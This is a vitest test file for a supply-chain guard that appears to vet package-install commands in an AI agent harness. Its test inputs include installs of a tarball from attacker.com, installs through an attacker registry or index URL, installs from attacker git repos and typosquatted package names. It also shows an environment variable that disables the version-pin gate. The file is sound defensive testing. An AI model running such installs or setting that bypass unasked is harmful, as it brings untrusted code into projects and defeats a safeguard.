import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
	addToAllowlist,
	type Allowlist,
	allowlistPath,
	hashLockfile,
	loadAllowlist,
	saveAllowlist,
} from "../package-allowlist.js";
import { parseInstallCommands } from "../package-install-parser.js";
import type { HarnessDecision } from "../types.js";
import { evaluatePackageInstall } from "./package-install-guard.js";

let workspace: string;

beforeEach(() => {
	workspace = mkdtempSync(join(tmpdir(), "guard-test-"));
});

afterEach(() => {
	rmSync(workspace, { recursive: true, force: true });
});

function evalCmd(command: string): HarnessDecision {
	const commands = parseInstallCommands(command);
	const al = loadAllowlist(workspace);
	const r = evaluatePackageInstall(commands, workspace, al);
	return r ?? { decision: "allow" };
}

describe("evaluatePackageInstall — empty / non-install", () => {
	it("returns null when no install commands parsed", () => {
		const r = evaluatePackageInstall([], workspace, loadAllowlist(workspace));
		expect(r).toBeNull();
	});

	it("uninstall is allowed (no new code)", () => {
		expect(evalCmd("npm uninstall lodash").decision).toBe("allow");
	});
});

describe("evaluatePackageInstall — registry packages", () => {
	// These target the ALLOWLIST decision, so the specs are exactly pinned to
	// satisfy the (independent) pin gate — otherwise the pin gate would block
	// first and mask the allowlist result being asserted here.
	it("blocks unapproved npm package", () => {
		const r = evalCmd("npm install lodash@4.17.21");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/lodash/);
		expect(r.reason).toMatch(/allowlist/i);
	});

	it("allows approved npm package", () => {
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "qcody" });
		expect(evalCmd("npm install lodash@4.17.21").decision).toBe("allow");
	});

	it("blocks if ONE of multiple packages is unapproved", () => {
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "x" });
		const r = evalCmd("npm install lodash@4.17.21 evil-typosquat@1.0.0");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/evil-typosquat/);
	});

	it("blocks pip install of unapproved package", () => {
		const r = evalCmd("pip install evil-package==1.0.0");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/evil-package/);
	});

	it("allows pip install of approved package", () => {
		addToAllowlist(workspace, "pypi", "requests", { approved_by: "x" });
		expect(evalCmd("pip install requests==2.31.0").decision).toBe("allow");
	});

	it("blocks cargo add of unapproved crate", () => {
		const r = evalCmd("cargo add evil");
		expect(r.decision).toBe("block");
	});

	it("blocks go get of unapproved module", () => {
		const r = evalCmd("go get github.com/evil/pkg");
		expect(r.decision).toBe("block");
	});
});

describe("evaluatePackageInstall — exact-pinned-version gate", () => {
	// Allowlist every name first so the ONLY thing that can block is the pin
	// gate — otherwise the allowlist miss would mask the pin result. Asserting
	// rule_id === "supply-chain-unpinned-version" proves it was the pin gate.
	function approveAll(): void {
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "x" });
		addToAllowlist(workspace, "npm", "@scope/pkg", { approved_by: "x" });
		addToAllowlist(workspace, "pypi", "requests", { approved_by: "x" });
		addToAllowlist(workspace, "go", "x", { approved_by: "x" });
		addToAllowlist(workspace, "rubygems", "x", { approved_by: "x" });
	}

	// ----- UNPINNED: must block on the pin gate (≥4) -----
	it.each([
		["npm install lodash", "absent version"],
		["npm i lodash@^4", "caret range"],
		["npm i lodash@latest", "dist-tag"],
		["npm i lodash@4", "major-only"],
		["pip install requests", "pip absent"],
		["pip install requests>=2", "pip range → major-only"],
		["go get x@latest", "go dist-tag"],
	])("blocks unpinned: %s (%s)", (cmd) => {
		approveAll();
		const r = evalCmd(cmd);
		expect(r.decision).toBe("block");
		expect(r.rule_id).toBe("supply-chain-unpinned-version");
		expect(r.reason).toMatch(/pin it/i);
	});

	// ----- PINNED: pin gate passes (allow, since names are allowlisted) (≥4) -----
	it.each([
		"npm i lodash@4.17.21",
		"pip install requests==2.31.0",
		"go get x@v1.2.3",
		"gem install x -v 1.2.3",
		"npm i @scope/pkg@1.2.3",
	])("allows pinned + allowlisted: %s", (cmd) => {
		approveAll();
		expect(evalCmd(cmd).decision).toBe("allow");
	});

	it("pin gate fires even when the name is allowlisted (independent gate)", () => {
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "x" });
		const r = evalCmd("npm install lodash");
		expect(r.decision).toBe("block");
		expect(r.rule_id).toBe("supply-chain-unpinned-version");
	});

	it("an unpinned but allowlisted pkg blocks BEFORE the allowlist check", () => {
		// lodash is allowlisted, evil is not. The pin gate on lodash fires first.
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "x" });
		const r = evalCmd("npm install lodash evil");
		expect(r.rule_id).toBe("supply-chain-unpinned-version");
		expect(r.reason).toMatch(/lodash/);
	});

	it("INTERLINKED_DISABLE_PACKAGE_GUARD=1 bypasses the pin gate", () => {
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "x" });
		const prev = process.env.INTERLINKED_DISABLE_PACKAGE_GUARD;
		process.env.INTERLINKED_DISABLE_PACKAGE_GUARD = "1";
		try {
			// lodash is allowlisted; with the pin gate bypassed this now allows.
			expect(evalCmd("npm install lodash").decision).toBe("allow");
		} finally {
			if (prev === undefined) delete process.env.INTERLINKED_DISABLE_PACKAGE_GUARD;
			else process.env.INTERLINKED_DISABLE_PACKAGE_GUARD = prev;
		}
	});

	// ----- NOT AFFECTED: bare manifest syncs must NOT hit the pin gate -----
	it.each(["npm install", "npm ci", "pip install -r requirements.txt"])(
		"does NOT pin-block bare manifest sync: %s",
		(cmd) => {
			// No positional registry specs → the per-spec pin loop is a no-op.
			// (These still block on the snapshot path in a fresh workspace, but
			// never with the pin rule id.)
			const r = evalCmd(cmd);
			expect(r.rule_id).not.toBe("supply-chain-unpinned-version");
		},
	);
});

describe("evaluatePackageInstall — URL specs always blocked", () => {
	it("blocks git URL even if a same-name package is approved", () => {
		addToAllowlist(workspace, "npm", "foo", { approved_by: "x" });
		const r = evalCmd("npm install git+https://github.com/attacker/foo");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/git/i);
	});

	it("blocks tarball URL", () => {
		const r = evalCmd("npm install https://attacker.com/payload.tgz");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/tarball|url/i);
	});

	it("blocks pip git+URL", () => {
		const r = evalCmd("pip install git+https://github.com/attacker/foo");
		expect(r.decision).toBe("block");
	});
});

describe("evaluatePackageInstall — custom registry", () => {
	it("blocks --registry override even with allowlisted package", () => {
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "x" });
		const r = evalCmd("npm install lodash --registry http://attacker.com");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/registry/i);
	});

	it("blocks pip --index-url override", () => {
		addToAllowlist(workspace, "pypi", "requests", { approved_by: "x" });
		const r = evalCmd("pip install requests --index-url http://attacker.com");
		expect(r.decision).toBe("block");
	});
});

describe("evaluatePackageInstall — local_path allowed", () => {
	it("allows local-path install (workspace code, not a registry pkg)", () => {
		expect(evalCmd("npm install ./my-local-pkg").decision).toBe("allow");
	});
});

describe("evaluatePackageInstall — lockfile snapshots", () => {
	it("blocks `npm ci` when no snapshot exists for package-lock.json", () => {
		writeFileSync(join(workspace, "package-lock.json"), '{"name":"x"}');
		const r = evalCmd("npm ci");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/snapshot|allowlist/i);
	});

	it("allows `npm ci` when lockfile hash matches stored snapshot", () => {
		const lf = join(workspace, "package-lock.json");
		writeFileSync(lf, '{"name":"x"}');
		const sha = hashLockfile(lf);
		const al: Allowlist = {
			version: 1,
			packages: { npm: {}, pypi: {}, cargo: {}, rubygems: {}, go: {} },
			lockfile_snapshots: {
				"package-lock.json": {
					sha256: sha!,
					approved_at: "2026-05-19",
					approved_by: "qcody",
				},
			},
		};
		saveAllowlist(workspace, al);
		expect(evalCmd("npm ci").decision).toBe("allow");
	});

	it("blocks `npm ci` when lockfile content changed after snapshot", () => {
		const lf = join(workspace, "package-lock.json");
		writeFileSync(lf, '{"name":"original"}');
		const originalHash = hashLockfile(lf);
		const al: Allowlist = {
			version: 1,
			packages: { npm: {}, pypi: {}, cargo: {}, rubygems: {}, go: {} },
			lockfile_snapshots: {
				"package-lock.json": {
					sha256: originalHash!,
					approved_at: "2026-05-19",
					approved_by: "qcody",
				},
			},
		};
		saveAllowlist(workspace, al);
		// Mutate the lockfile
		writeFileSync(lf, '{"name":"mutated"}');
		const r = evalCmd("npm ci");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/changed|snapshot|drift/i);
	});
});

describe("evaluatePackageInstall — manifest-only sync (npm install no args)", () => {
	it("blocks bare `npm install` when no snapshot exists", () => {
		writeFileSync(join(workspace, "package.json"), '{"dependencies":{"foo":"1"}}');
		const r = evalCmd("npm install");
		expect(r.decision).toBe("block");
	});

	it("allows `npm install` when package.json hash matches snapshot (no lockfile)", () => {
		const mf = join(workspace, "package.json");
		writeFileSync(mf, '{"dependencies":{"foo":"1"}}');
		const sha = hashLockfile(mf);
		const al: Allowlist = {
			version: 1,
			packages: { npm: {}, pypi: {}, cargo: {}, rubygems: {}, go: {} },
			lockfile_snapshots: {
				"package.json": {
					sha256: sha!,
					approved_at: "2026-05-19",
					approved_by: "qcody",
				},
			},
		};
		saveAllowlist(workspace, al);
		expect(evalCmd("npm install").decision).toBe("allow");
	});

	it("prefers lockfile snapshot over manifest snapshot when both exist", () => {
		const mf = join(workspace, "package.json");
		const lf = join(workspace, "package-lock.json");
		writeFileSync(mf, '{"dependencies":{"foo":"1"}}');
		writeFileSync(lf, '{"name":"lock"}');
		const lockSha = hashLockfile(lf);
		const al: Allowlist = {
			version: 1,
			packages: { npm: {}, pypi: {}, cargo: {}, rubygems: {}, go: {} },
			lockfile_snapshots: {
				"package-lock.json": {
					sha256: lockSha!,
					approved_at: "2026-05-19",
					approved_by: "qcody",
				},
			},
		};
		saveAllowlist(workspace, al);
		expect(evalCmd("npm install").decision).toBe("allow");
	});
});

describe("evaluatePackageInstall — effective cwd (P1.4)", () => {
	it("`cd packages/app && npm ci` checks the SUBDIR's lockfile, not root's", () => {
		// Root lockfile + matching root snapshot
		const rootLf = join(workspace, "package-lock.json");
		writeFileSync(rootLf, '{"name":"root"}');
		const rootSha = hashLockfile(rootLf);
		// Subdir lockfile, NO snapshot for it
		mkdirSync(join(workspace, "packages/app"), { recursive: true });
		writeFileSync(
			join(workspace, "packages/app/package-lock.json"),
			'{"name":"subapp"}',
		);
		const al: Allowlist = {
			version: 1,
			packages: { npm: {}, pypi: {}, cargo: {}, rubygems: {}, go: {} },
			lockfile_snapshots: {
				"package-lock.json": {
					sha256: rootSha!,
					approved_at: "2026-05-19",
					approved_by: "qcody",
				},
			},
		};
		saveAllowlist(workspace, al);
		// Without P1.4 this would silently pass against root snapshot.
		const r = evalCmd("cd packages/app && npm ci");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/packages\/app|snapshot|mismatch/i);
	});

	it("matches a subdir snapshot when cd'd into that subdir", () => {
		mkdirSync(join(workspace, "packages/app"), { recursive: true });
		const subLf = join(workspace, "packages/app/package-lock.json");
		writeFileSync(subLf, '{"name":"subapp"}');
		const subSha = hashLockfile(subLf);
		const al: Allowlist = {
			version: 1,
			packages: { npm: {}, pypi: {}, cargo: {}, rubygems: {}, go: {} },
			lockfile_snapshots: {
				"package-lock.json": {
					sha256: subSha!,
					approved_at: "2026-05-19",
					approved_by: "qcody",
				},
			},
		};
		saveAllowlist(workspace, al);
		expect(evalCmd("cd packages/app && npm ci").decision).toBe("allow");
	});
});

describe("evaluatePackageInstall — harness-required dev tooling carve-out", () => {
	// The coverage catch-22: the harness's own coverage/complexity gates require
	// these providers, but they aren't on a fresh repo's allowlist. The carve-out
	// treats an EXACT (ecosystem, name) match as allowlisted for the membership
	// check ONLY — the pin gate and typosquat guard still apply. None of the
	// names below are added to the workspace allowlist, proving the carve-out
	// (not the allowlist) is what permits them.

	// ----- ALLOWED: exact, pinned, in-ecosystem providers (≥4) -----
	it.each([
		"npm install @vitest/coverage-v8@4.0.18",
		"npm install @vitest/coverage-istanbul@4.0.18",
		"npm install vitest@2.1.0",
		"pip install pytest-cov==5.0.0",
		"pip install coverage==7.0.0",
		"pip install pytest==8.0.0",
		"pip install radon==6.0.1",
	])("allows pinned harness tooling NOT on the allowlist: %s", (cmd) => {
		expect(evalCmd(cmd).decision).toBe("allow");
	});

	// ----- BLOCKED: carve-out does not weaken the pin / scope / ecosystem gates (≥4) -----
	it("still blocks unpinned harness tooling (pin gate applies first)", () => {
		const r = evalCmd("npm install @vitest/coverage-v8");
		expect(r.decision).toBe("block");
		expect(r.rule_id).toBe("supply-chain-unpinned-version");
	});

	it("still blocks a non-carved-out normal package", () => {
		const r = evalCmd("npm install left-pad@1.0.0");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/left-pad/);
		expect(r.rule_id).toBe("supply-chain-unapproved-package");
	});

	it("blocks a provider-lookalike typosquat (not an exact carve-out match)", () => {
		// `@vitest/coverage-v8-malware` is not in the curated set, so it takes the
		// normal allowlist path and is rejected as unapproved.
		const r = evalCmd("npm install @vitest/coverage-v8-malware@1.0.0");
		expect(r.decision).toBe("block");
		expect(r.rule_id).toBe("supply-chain-unapproved-package");
	});

	it("does NOT carve out a provider name in the wrong ecosystem", () => {
		// `vitest` is npm tooling; under pypi it is not a member, so the normal
		// allowlist path blocks it.
		const r = evalCmd("pip install vitest==1.0.0");
		expect(r.decision).toBe("block");
		expect(r.rule_id).toBe("supply-chain-unapproved-package");
	});

	it("does NOT carve out a near-miss of a provider name", () => {
		// `@vitest/coverage-v9000` differs from the curated `@vitest/coverage-v8`,
		// so it is not an exact match and falls through to the allowlist block.
		const r = evalCmd("npm install @vitest/coverage-v9000@1.0.0");
		expect(r.decision).toBe("block");
		expect(r.rule_id).toBe("supply-chain-unapproved-package");
	});

	it("does NOT carve out a git URL for a provider name", () => {
		// URL specs are never registry kind → never members; URL gate still fires.
		const r = evalCmd("npm install git+https://github.com/attacker/vitest");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/git/i);
	});
});

describe("evaluatePackageInstall — compound", () => {
	it("blocks the whole compound if any segment is unapproved", () => {
		// Pin lodash so the block comes from `evil`'s allowlist miss, not the
		// pin gate on the first segment.
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "x" });
		const r = evalCmd("npm install lodash@4.17.21 && pip install evil==1.0.0");
		expect(r.decision).toBe("block");
		expect(r.reason).toMatch(/evil/);
	});

	it("allows when every segment is approved", () => {
		addToAllowlist(workspace, "npm", "lodash", { approved_by: "x" });
		addToAllowlist(workspace, "pypi", "requests", { approved_by: "x" });
		expect(
			evalCmd("npm install lodash@4.17.21 && pip install requests==2.31.0").decision,
		).toBe("allow");
	});
});
